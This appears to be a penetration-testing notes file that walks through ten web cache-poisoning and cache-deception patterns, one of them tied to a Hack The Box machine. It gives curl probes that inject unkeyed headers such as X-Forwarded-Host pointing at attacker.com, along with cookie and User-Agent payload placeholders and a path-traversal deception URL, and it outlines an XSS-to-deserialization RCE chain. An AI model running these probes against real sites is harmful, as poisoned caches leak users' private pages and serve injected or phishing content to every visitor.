# Case studies — the cache-poisoning shapes, worked end to end

Complete walkthroughs of the real cache-poisoning shapes.

---

## Case 1 — the authenticated-page-served-anonymously — the verified card

The HTB Encodecept shape — an authenticated page cached + served
anonymously + a charset XSS + a marshal RCE.

```text
the shape: an authenticated page cached under a URL the anonymous
requester also fetches — the cache keys on the URL, not the auth
state — the stored copy is the privileged page served to anyone.
```

```bash
# an authenticated GET stores the privileged page
curl "$BASE/settings.html?cb=<unique>" -H 'Cookie: <auth>'
# an anonymous GET — the stored copy serves it
curl "$BASE/settings.html?cb=<unique>"   # anonymous — HIT?
#   the anonymous request returns the authenticated page (a 200 with
#   the content, not a 302 to login) → deception
```

```text
the chain: the deception + an unkeyed reflected charset XSS stored
in the cached page + a marshal deserialization RCE — the privileged
bot's XSS writes files inside the container.
```

## Case 2 — the unkeyed-header-poisoned-page — the injected response

```text
an unkeyed reflected header — YOUR header's effect is stored under
the public URL — every requester's copy carries YOUR injected
content.
```

```bash
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Host: attacker.com'
curl "$BASE/page?cb=<unique>"   # a clean request — attacker.com reflected?
```

## Case 3 — the path-normalization deception — the route confusion

```text
a path the cache and the app normalize differently — a static-looking
URL served the dynamic response — the stored copy's URL is the
victim's URL, the response is YOUR request's.
```

```bash
curl "$BASE/static/../admin?cb=<unique>"
curl "$BASE/static/../admin?cb=<unique>"   # the stored copy's URL is the victim's
```

## Case 4 — the personalized-page-served-publicly — the per-user leak

```text
a personalized page (a profile, a dashboard) cached under a shared
URL — the stored copy serves YOUR personalized content to every
requester — a session-data leak.
```

## Case 5 — the Host-header deception — the URL-rewrite leak

```text
an unkeyed Host/X-Forwarded-Host — the app's absolute URLs use YOUR
host — the stored copy's links point to YOUR domain — a redirect/
phishing surface.
```

```bash
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Host: attacker.com'
# the stored copy's links point to attacker.com — a redirect surface
```

## Case 6 — the scheme-header deception — an http/https downgrade

```text
an unkeyed X-Forwarded-Scheme — the app's absolute URLs use YOUR
scheme — the stored copy's links point to http — a downgrade.
```

```bash
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Scheme: http'
# the stored copy's links point to http — a downgrade
```

## Case 7 — the UA-dependent deception — a per-UA response

```text
an unkeyed User-Agent — the app personalizes on the UA — the stored
copy serves YOUR UA's response to every requester.
```

```bash
curl "$BASE/page?cb=<unique>" -A '<payload>'
# the stored copy serves YOUR UA's response to every requester
```

## Case 8 — the language deception — a localized response

```text
an unkeyed Accept-Language — the app localizes on it — the stored
copy serves YOUR language to every requester.
```

```bash
curl "$BASE/page?cb=<unique>" -H 'Accept-Language: <payload>'
# the stored copy serves YOUR language to every requester
```

## Case 9 — the cookie deception — a per-cookie response

```text
an unkeyed cookie — the app personalizes on it — the stored copy
carries the per-cookie response to every requester.
```

```bash
curl "$BASE/page?cb=<unique>" -H 'Cookie: theme=<payload>'
# the stored copy carries the theme to every requester
```

## Case 10 — the param-append deception — a keyed-param confusion

```text
a keyed param the app ignores vs an unkeyed param the app reads —
the deception is in which param carries the effect and which carries
the key.
```

## The per-case ledger

```bash
python3 tools/state.py <c> --hypothesis \
  "cache-poison-case: <shape> — input=<unkeyed> — key=<cached-parts>"
```
